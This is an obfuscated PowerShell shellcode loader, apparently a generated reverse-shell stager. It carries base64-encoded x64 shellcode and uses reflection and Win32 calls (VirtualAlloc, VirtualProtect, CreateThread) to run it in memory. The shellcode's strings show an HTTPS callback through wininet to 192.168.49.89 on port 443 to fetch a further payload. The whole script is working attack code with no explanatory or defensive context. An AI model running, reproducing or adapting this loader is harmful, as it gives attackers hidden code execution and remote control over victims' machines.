function ym97i {
        Param ($ypHI, $f96IL)
        $nIa = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $nIa.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($nIa.GetMethod('GetModuleHandle')).Invoke($null, @($ypHI)))), $f96IL))
}

function gYMqf {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $zQbUo,
                [Parameter(Position = 1)] [Type] $m5U2 = [Void]
        )

        $jWsg = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $jWsg.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $zQbUo).SetImplementationFlags('Runtime, Managed')
        $jWsg.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $m5U2, $zQbUo).SetImplementationFlags('Runtime, Managed')

        return $jWsg.CreateType()
}

[Byte[]]$dEG = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgSItSGEiLUiBWTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSITTHJSAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A4AAAAxOTIuMTY4LjQ5Ljg5AFpIicFJx8C7AQAATTHJU1NqA1NJuleJn8YAAAAA/9XoqwAAAC9SYzFhXzFFVjZLNHFFaXNRU0lzLWJBbk1pcHRCanNfTkpBYkMzZ3d1S2drTzFULXlKVlhucmN5NmRpZDZ0MEIyblV1cTc1QmtaQXR6Q2ozcGdfSkhOZG1UZEpSQnFyVkxZb04talFfdVptbmNHMEhfT0JaREdod0d4QW5hSS1HS1BJQTdRWks2ZktRcERkeGY1cUxrcm00eXRBQTB2VjBhWnhuY1FzdEpCAEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWbvgHSoKQYna/9U=")
[Uint32]$o9xb = 0
$xw8C = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ym97i kernel32.dll VirtualAlloc), (gYMqf @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dEG.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($dEG, 0, $xw8C, $dEG.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ym97i kernel32.dll VirtualProtect), (gYMqf @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($xw8C, [Uint32]$dEG.Length, 0x10, [Ref]$o9xb)) -eq $true) {
        $c74bY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ym97i kernel32.dll CreateThread), (gYMqf @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xw8C,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ym97i kernel32.dll WaitForSingleObject), (gYMqf @([IntPtr], [Int32]))).Invoke($c74bY,0xffffffff) | Out-Null
}
